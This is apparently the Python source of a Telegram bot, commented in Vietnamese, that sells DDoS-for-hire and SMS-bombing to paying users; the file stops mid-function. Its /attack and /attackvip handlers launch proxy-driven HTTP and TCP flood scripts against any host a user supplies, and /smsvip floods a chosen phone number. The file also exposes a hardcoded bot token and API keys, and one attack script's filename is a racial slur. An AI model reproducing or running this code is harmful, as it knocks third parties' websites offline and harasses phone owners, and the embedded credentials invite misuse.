import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import json
import threading
import base64
import zlib
from telebot import TeleBot, types


bot_token = '6348531467:AAExVAa-ycfy06fiGmT-hpQqn-E5-d4n8fQ'

bot = telebot.TeleBot(bot_token)

# Danh sách lưu trữ thông tin mua key
purchases = {}

# Các loại thẻ cho phép
ALLOWED_CARD_TYPES = ['viettel', 'mobifone', 'vinaphone']

# Các số tiền cho phép
ALLOWED_AMOUNTS = ['20k', '50k', '100k']

allowed_group_id = -1001723089040

allowed_users = [5805939083]
allowed_usersvip = []
processes = []
ADMIN_ID = 5805939083
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id
 INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['adduser'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /adduser + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh 30 Ngày')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='Vui Lòng Chờ...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://traffic24h.net/Getapi.php?api=gmYcepbqBdPzHThxrsDwfyNCvAIUMVkXtinlEJWKSZojFQRaGLuO&url=https://gachcard5s.click/key.php/?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "FLấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
    
    text = f'''
- Cảm Ơn Bạn Đã GET Key Free-
- Link Lấy Key Hôm Nay Là: {key}
- Nhập Key Bằng Lệnh /checkkey + [key] -
- Nếu bạn có nhu cầu mua key vip vui lòng sử dụng lệnh /hdsd
 [Lưu ý: mỗi key chỉ có 1 người dùng]
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['checkkey'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Lòng Nhập checkKey\nVí Dụ /checkkey botvipvcl\nSử Dụng Lệnh /getkey Để Lấy Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhập Key Thành Công')
    else:
        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')


@bot.message_handler(commands=['startbot', 'help'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh 📌

1/ Lệnh Lấy Key Và Nhập Key
- /key : Coi cách lấy key free và cách mua.
- /muakeyvip : Để coi cách Mua Key VIP.

2/ Lệnh Spam ☎
- /spam : Coi cách sử dụng lệnh spam.
    
3/ Lệnh DDoS ( Tấn Công Website )
- /method : Coi lệnh sử dụng ddos.
- /hdsd : dùng để coi hdsd về cách thức gửi lệnh để tấn công

4/ Lệnh Có Ích ^^-
-/menu : Coi Các lệnh có ích khác.

5/ Các lệnh liên quan đến proxy
- /proxy : Coi các lệnh liên quan đến proxy.

6/ Lệnh chỉ dành cho admin.
- /vip : Các lệnh dành cho admin.

7/ Lệnh chat gpt.
- /gpt : hdsd chat gpt free.

8/ Lệnh coi cách enc code nodejs hoặc code python.
- /enc : Hdsd enc.

'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['menu'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh Có Ích 📌

- /getcode + [host] : Lấy Source Code Website📝
- /checkantiddos + [host] : Kiểm Tra AntiDDoS 👀
- /uptime : Số Thời Gian Bot Hoạt Động ⏰
 @Info Admin
- /admin : Info Admin

'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['method'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh Ddos 📌



- /hdsd : dùng để coi hdsd về cách thức gửi lệnh để tấn công

- /attackvip + [methods] + [host]✓

 -+ LƯU Ý  : /attackvip Chỉ dành cho plant mua key vip, Chất lượng ddos và time được nâng cao x2 so với bản free +-
 
 -+ Cách sử dụng : vẫn như lệnh /attack free, nhưng chỉ thay lệnh /attack thành /attackvip và thay các tham số như bình thường +-
 ---------------------------------------------------------------
 
- /attack + [methods] + [host] 💣
- /methods : Để Xem Methods ✔

'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['vip'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh Chỉ Dành cho admin 📌

- /onbot : On Bot
- /offbot : Off Bot
- /udproxy : scan proxy mới.
- /checkcpu : Coi thông tin máy chủ.
- /adduser + [id] : thêm key free 30 ngày.
- /addvip + [id] : thêm key VIP 30 ngày.
Để xác nhận mua key thành công, admin sử dụng lệnh:
- /thanhcong <id>
Để xác nhận mua key không thành công, admin sử dụng lệnh:
- /thatbai <id>\n" \
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True


@bot.message_handler(commands=['key'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh Key 📌

- /id : Coi id bản thân.
- /muakeyvip : Để coi cách Mua Key VIP
- /getkey : Để lấy key 🔐
- /checkkey + [Key] : Kích Hoạt Key 🔓
- /muakeyv : admin !

'''
    bot.reply_to(message, help_text)
    
is_bot_active = True

@bot.message_handler(commands=['proxy'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh Proxy 📌

- /checkproxy : Check Số Lượng Proxy 🌌
- /updateproxy : Proxy Sẽ Tự Động Update Sau 10 Phút
[ Proxy Live 95% Die 5 % ]🤖



'''
    bot.reply_to(message, help_text)
    
is_bot_active = True

@bot.message_handler(commands=['spam'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh Key 📌

- /smsvip + [Số Điện Thoại] : Spam VIP ☎ 💸
- /statusspam : số quy trình đang chạy ☎

'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['smsvip'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /smsvip + [số điện thoại]')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0384955612']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'Bạn không được spam số này.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Vui lòng đợi {remaining_time} giây trước khi tiếp tục sử dụng lệnh này.')
        return
    
    cooldown_dict[user_id] = time.time()

    username = message.from_user.username

    bot.reply_to(message, f'@{username} Đang Tiến Hành Spam')

    args = message.text.split()
    phone_number = args[1]

    # Gửi dữ liệu tới api
    url = f"https://api.viduchung.info/spam-sms/?key=cardvip247&phone={phone_number}"
    response = requests.get(url)
    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "240"])
    processes.append(process)

    bot.reply_to(message, f'┏━━━━━━━━━━━━━━━━━━┓\n┣➤ 🚀 Gửi Yêu Cầu Tấn Công Thành Công 🚀 \n┣➤ Bot 👾: @SPAMSMSLORD_bot \n┣➤ Số Tấn Công 📱: [ {phone_number} ]\nThời gian 🕐: 240s ✅\n┗━━━━━━━━━━━━━━━━━━┛\n')
 

@bot.message_handler(commands=['statusspam'])
def status(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, '🚀Bạn không có quyền sử dụng lệnh này.🚀')
        return
    process_count = len(processes)
    bot.reply_to(message, f'🚀Số quy trình đang chạy:🚀 {process_count}.')
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 Tất Cả Methods:
- /layer7 : Coi các lệnh tấn công website (layer7).
- /layer4 : Chua update, ko sd dc.
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['layer7'])
def methods(message):
    help_text = '''
🚀 Layer7 🚀

[ Không Gov, Edu ]

- VIP
- VIP2
- VIP3
- VIP4
- VIP5
- VIP6
- VIP7
- VIP8
- VIP9
- VIP10
- VIP11
- VIP12
- VIP13
- VIP14
- VIP15
- /VIP16

'''
    bot.reply_to(message, help_text)




@bot.message_handler(commands=['hdsd'])
def methods(message):
    help_text = '''
HDSD VIP ™
- /attack + methods + link [ plant free ]
- /attackvip + methods + link [ plant buy]
- methods : Dùng lệnh /layer7 để coi methods
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['layer4'])
def methods(message):
    help_text = '''
🚀 Layer4 🚀

- TCP-HOME
- ĐANG UPDATE VUI LÒNG ĐỢI !!!
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập checkKey\nSử dụng lệnh /getkey để lấy Key')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 200:
        remaining_time = int(200 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

   
    if method in ['TCP-BYPASS', 'TCP-HOME'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
        return

    if method in ['TCP-HOME', 'TCP-BYPASS']:
        port = args[3]
    else:
        port = None

    blocked_domains = ["chinhphu.vn"]   
    if method == 'VIP' or method == 'VIP2' or method == 'VIP3' or method == 'VIP4' or method == 'VIP5' or method == 'VIP6' or method == 'VIP7' or method == 'VIP8' or method == 'VIP9' or method == 'VIP10' or method == 'VIP11' or method == 'VIP12' or method == 'VIP13' or method == 'VIP14' or method == 'VIP15' or method == 'VIP16':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    if method in ['VIP', 'VIP2', 'VIP3', 'VIP4', 'VIP5', 'VIP6', 'VIP7', 'VIP8', 'VIP9', 'VIP10', 'VIP11', 'VIP12', 'VIP13', 'VIP14', 'VIP16', 'VIP15', 'TCP-HOME', 'TCP-BYPASS']:
        # Update the command and duration based on the selected method
        if method == 'VIP':
            command = ["node", "vip.js", host, "100", "5", "proxy.txt", "64"]
            duration = 100
        elif method == 'VIP2':
            command = ["node", "HTTPS-TLS.js", host, "100", "64", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP3':
            command = ["node", "http-smack.js", host, "100", "64", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP4':
            command = ["node", "4.js", host, "100", "64", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP5':
            command = ["node", "vip2.js", host, "100", "5", "proxy.txt", "64"]
            duration = 100
        elif method == 'VIP6':
            command = ["node", "6.js", host, "100", "64", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP7':
            command = ["node", "TLSV1.js", host, "100", "5", "64", "proxy.txt", "PRI"]
            duration = 100
        elif method == 'VIP8':
            command = ["node", "TLSV3.js", host, "100", "5", "64", "proxy.txt", "PRI"]
            duration = 100
        elif method == 'VIP9':
            command = ["node", "DESTROY.js", host, "100", "64", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP10':
            command = ["node", "http-load.js", host, "100", "64", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP11':
             command = ["node", "https.js", host, "100", "64", "5", "proxy.txt"]
             duration = 100
        elif method == 'VIP12':
            command = ["node", "love.js", host, "100", "5",  "proxy.txt", "64", "0"]
            duration = 100
        elif method == 'VIP13':
            command = ["node", "HTTPS-BYPASSv2.js", host, "100", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP14':
            command = ["node", "BYPASS-V3.js", "GET", host, "proxy.txt", "100", "64", "5"]
            duration = 100
        elif method == 'VIP15':
            command = ["node", "nigger.js", host, "100", "64", "5", "proxy.txt"]
            duration = 100
        elif method == 'VIP16':
            command = ["node", "vip3.js", host, "100", "5", "proxy.txt", "64"]
            duration = 100
        elif method == 'TCP-BYPASS':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = [ ]
            duration = 100
        elif method == 'TCP-HOME':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["perl", "home.pl", host, port, "3500", "100"]
            duration = 100

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃  💣 Successful Attack!!!💣\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Admin : @citylightverry\n┣➤ Check host : https://check-host.net/check-http?host={host}\n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')

@bot.message_handler(commands=['checkproxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Không tìm thấy file proxy.txt.")
    else:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Số proxy mới cập nhật là: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Đợi 1 giờ trước khi kiểm tra lại

@bot.message_handler(commands=['checkcpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')


# Hàm kiểm tra xem một người dùng có phải là admin hay không
def is_admin(user_id):
    return user_id == ADMIN_ID

@bot.message_handler(commands=['offbot'])
def turn_off(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')

@bot.message_handler(commands=['onbot'])
def turn_on(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True


@bot.message_handler(commands=['getcode'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập checkKey\nSử dụng lệnh /getkey để lấy Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /getcode + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['checkantiddos'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nHDSD : /checkantiddos + [link website ko bao Gồm http, https, www].\nVí dụ : /checkantiddos dstat.cc')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không antiddos."
        else:
            reply += "Website có nhiều hơn 1 ip khả năng antiddos rất cao.\nKhông thể tấn công website này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: @citylightverry")
@bot.message_handler(commands=['muakeyv'])
def send_admin_link(message):
    bot.reply_to(message, "Inbox Admin Để Mua Key Vip Giá 30000đ/30 ngày . Telegram : @citylightverry")


@bot.message_handler(commands=['id'])
def send_user_id(message):
    user_id = message.from_user.id
    reply_markup = types.InlineKeyboardMarkup()
    copy_button = types.InlineKeyboardButton("Sao chép ID", callback_data=f"copy_id_{user_id}")
    reply_markup.add(copy_button)
    bot.reply_to(message, f"ID của bạn là `{user_id}`. Nhấn vào nút bên dưới để sao chép.", parse_mode="Markdown", reply_markup=reply_markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('copy_id_'))
def copy_user_id(call):
    user_id = call.data.split('_')[2]
    bot.answer_callback_query(call.id, text=f"ID của bạn ({user_id}) đã được sao chép vào clipboard.")
    # Bạn có thể triển khai cách sao chép ID người dùng vào clipboard ở đây (tùy thuộc vào nền tảng).


@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['updateproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy.txt.")


@bot.message_handler(commands=['id'])
def send_user_id(message):
    user_id = message.from_user.id
    bot.reply_to(message, f"Your ID is: {user_id}")


@bot.message_handler(commands=['uptime'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')



# Định nghĩa lệnh /muakey + mã thẻ + loại thẻ + số tiền
@bot.message_handler(commands=['muakey'])
def handle_muakey_command(message):
    # Lấy thông tin từ tin nhắn
    command_args = message.text.split()[1:]  # Loại bỏ /muakey
    if len(command_args) != 3:
        bot.reply_to(message, "Sai định dạng lệnh. Vui lòng nhập lại.")
        return

    card_code = command_args[0].lower()  # Mã thẻ, chuyển thành chữ thường
    card_type = command_args[1].lower()  # Loại thẻ, chuyển thành chữ thường
    amount = command_args[2].lower()  # Số tiền, chuyển thành chữ thường

    # Kiểm tra loại thẻ có hợp lệ không
    if card_type not in ALLOWED_CARD_TYPES:
        bot.reply_to(message, f"Loại thẻ không hợp lệ. Chỉ chấp nhận: {', '.join(ALLOWED_CARD_TYPES)}")
        return

    # Kiểm tra số tiền có hợp lệ không
    if amount not in ALLOWED_AMOUNTS:
        bot.reply_to(message, f"Số tiền không hợp lệ. Chỉ chấp nhận: {', '.join(ALLOWED_AMOUNTS)}")
        return

    # Lưu thông tin nạp tiền cho admin
    admin_message = f"**Thông tin nạp tiền**\n" \
                    f"ID: [{message.from_user.id}](tg://user?id={message.from_user.id})\n" \
                    f"Số tiền: {amount}\n" \
                    f"Mã thẻ: [{card_code}](tg://url?url={card_code})\n" \
                    f"Loại thẻ: {card_type}"
    purchases[message.from_user.id] = admin_message

    # Gửi thông điệp cho admin (sử dụng ADMIN_ID)
    bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')

    # Trả lời tin nhắn của người dùng
    bot.reply_to(message, "Đã gửi thông tin nạp tiền cho admin. Đợi duyệt mua key.")

# Định nghĩa lệnh /thanhcong + id
@bot.message_handler(commands=['thanhcong'])
def handle_thanhcong_command(message):
    # Kiểm tra xem người gửi là admin
    if message.from_user.id == ADMIN_ID:
        # Lấy ID người dùng từ lệnh
        command_args = message.text.split()[1:]  # Loại bỏ /thanhcong
        if len(command_args) != 1:
            bot.reply_to(message, "Sai định dạng lệnh. Vui lòng nhập lại.")
            return

        user_id = int(command_args[0])
        if user_id in purchases:
            purchase_info = purchases[user_id]
            # Thông báo mua key thành công cho người dùng
            bot.send_message(user_id, "Admin đã duyệt mua key thành công.\n" + purchase_info, parse_mode='Markdown')
            # Xóa thông tin mua key khỏi danh sách lưu trữ
            del purchases[user_id]
            bot.reply_to(message, "Thông báo mua key thành công đã được gửi đến người dùng.")
        else:
            bot.reply_to(message, "Không tìm thấy thông tin mua key cho người dùng này.")
    else:
        bot.reply_to(message, "Bạn không có quyền sử dụng lệnh này.")

# Định nghĩa lệnh /thatbai + id
@bot.message_handler(commands=['thatbai'])
def handle_thatbai_command(message):
    # Kiểm tra xem người gửi là admin
    if message.from_user.id == ADMIN_ID:
        # Lấy ID người dùng từ lệnh
        command_args = message.text.split()[1:]  # Loại bỏ /thatbai
        if len(command_args) != 1:
            bot.reply_to(message, "Sai định dạng lệnh. Vui lòng nhập lại.")
            return

        user_id = int(command_args[0])
        if user_id in purchases:
            purchase_info = purchases[user_id]
            # Thông báo mua key không thành công cho người dùng
            bot.send_message(user_id, "Admin đã thông báo rằng mua key không thành công.\n" + purchase_info,
                             parse_mode='Markdown')
            # Xóa thông tin mua key khỏi danh sách lưu trữ
            del purchases[user_id]
            bot.reply_to(message, "Thông báo mua key không thành công đã được gửi đến người dùng.")
        else:
            bot.reply_to(message, "Không tìm thấy thông tin mua key cho người dùng này.")
    else:
        bot.reply_to(message, "Bạn không có quyền sử dụng lệnh này.")

@bot.message_handler(commands=['muakeyvip'])
def handle_hdsd_command(message):
    hdsd_message = "Chào mừng bạn đến với hdsd mua key!\n" \
                   "Để mua key, vui lòng sử dụng lệnh sau:\n" \
                   "/muakey <mã thẻ> <loại thẻ> <số tiền>\n" \
                   "Ví dụ: /muakey 1234567890 viettel 50k\n" \
                   "chỉ nhận các loại thẻ : viettel, mobifone, vinaphone\n" \
                   "chỉ nhận thẻ có mệnh giá trong : 20k, 50k, 100k.\n" \
                   "Admin sẽ duyệt mua key và thông báo cho bạn.\n" \
                   "Chúc bạn mua sắm vui vẻ!"
    bot.send_message(message.chat.id, hdsd_message, parse_mode='Markdown')

@bot.message_handler(commands=['udproxy'])
def run_proxy_command(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền thực hiện lệnh này.')
        return

    # Thực thi file proxy.py
    try:
        subprocess.run(['python', 'proxy.py'])
        bot.reply_to(message, 'Đã chạy update proxy')
    except Exception as e:
        bot.reply_to(message, f'Lỗi: {str(e)}')


@bot.message_handler(commands=['gpt'])
def handle_start(message):
    bot.send_message(message.chat.id, "🍀 XIN CHÀO TÔI LÀ CHAT GPT , ADMIN : @citylightverry 🍀\n\n[/ask + cau hoi, ĐỂ SỬ DỤNG BOT ]")

@bot.message_handler(commands=['ask'])
def handle_ask(message):
    question = message.text[5:].strip()
    if not question:
        bot.send_message(message.chat.id, "🍀 VUI LÒNG NHẬP CÂU HỎI 🍀")
        return

    response_message = get_answer_from_api(question)
    bot.send_message(message.chat.id, response_message)

def get_answer_from_api(question):
    url = f"https://api.fasttube.ir/?key=3e3d755ed58bc3fbd5d130ceead1d5f0&text={question}"
    response = requests.get(url)
    
    if response.status_code == 200:
        try:
            data = json.loads(response.text)
            message = data.get("message")
            if message:
                return message
            else:
                return "Không có phần 'message' trong JSON từ trang web."
        except json.JSONDecodeError as e:
            return f"Lỗi khi phân tích JSON từ trang web: {str(e)}"
    else:
        return "ĐÃ CÓ LỖI NGOÀI Ý MUỐN XẢY RA VUI LÒNG LIÊN HỆ ADMIN : @citylightverry"
        
@bot.message_handler(commands=['addvip'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /addvip + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_usersvip.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh /attackvip 30 Ngày')


load_users_from_database()



@bot.message_handler(commands=['attackvip'])
def attack_command(message):
    user_id = message.from_user.id

    if user_id not in allowed_usersvip:
        bot.reply_to(message, text='Vui lòng mua key ')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /attackvip + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 200:
        remaining_time = int(200 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attackvip.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['TCP-BYPASS', 'TCP-HOME'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attackvip {method} {host} [port]')
        return

    if method in ['TCP-HOME', 'TCP-BYPASS']:
